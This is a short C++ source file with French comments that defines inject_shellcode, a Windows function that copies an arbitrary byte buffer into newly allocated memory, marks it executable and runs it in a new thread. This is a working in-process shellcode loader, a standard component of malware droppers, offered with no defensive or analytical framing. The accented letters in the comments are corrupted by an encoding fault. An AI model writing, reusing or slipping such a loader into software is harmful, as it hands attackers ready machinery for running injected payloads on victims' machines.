#include "memory_handler.h"
#include <windows.h>
#include <iostream>

// Fonction pour injecter et ex�cuter le shellcode dans le processus courant
bool inject_shellcode(char* shellcode, size_t size) {
    // Allouer de la m�moire avec les permissions PAGE_EXECUTE_READWRITE
    void* execMem = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "Erreur d'allocation de m�moire" << std::endl;
        return false;
    }

    // Copier le shellcode dans la m�moire allou�e
    unsigned char* pDest = static_cast<unsigned char*>(execMem);
    unsigned char* pSrc = reinterpret_cast<unsigned char*>(shellcode);

    // Copier les donn�es octet par octet
    for (size_t i = 0; i < size; ++i) {
        pDest[i] = pSrc[i]; // Copie manuelle de chaque octet
    }

    // Changer les permissions de la m�moire pour seulement la rendre ex�cutable
    DWORD oldProtect;
    if (VirtualProtect(execMem, size, PAGE_EXECUTE_READ, &oldProtect) == 0) {
        std::cerr << "Erreur de modification des protections de m�moire" << std::endl;
        VirtualFree(execMem, 0, MEM_RELEASE);
        return false;
    }

    // Cr�er un thread pour ex�cuter le shellcode
    DWORD threadId;
    HANDLE threadHandle = CreateThread(
        nullptr,       // Security attributes
        0,             // Stack size
        reinterpret_cast<LPTHREAD_START_ROUTINE>(execMem), // Function to execute (the shellcode)
        nullptr,       // Parameter to the thread function
        0,             // Creation flags
        &threadId      // Thread ID
    );

    if (threadHandle == nullptr) {
        std::cerr << "Erreur lors de la cr�ation du thread" << std::endl;
        VirtualFree(execMem, 0, MEM_RELEASE);
        return false;
    }

    // Attendre que le thread termine son ex�cution
    WaitForSingleObject(threadHandle, INFINITE);

    // Lib�rer la m�moire apr�s ex�cution
    VirtualFree(execMem, 0, MEM_RELEASE);
    CloseHandle(threadHandle);

    return true;
}
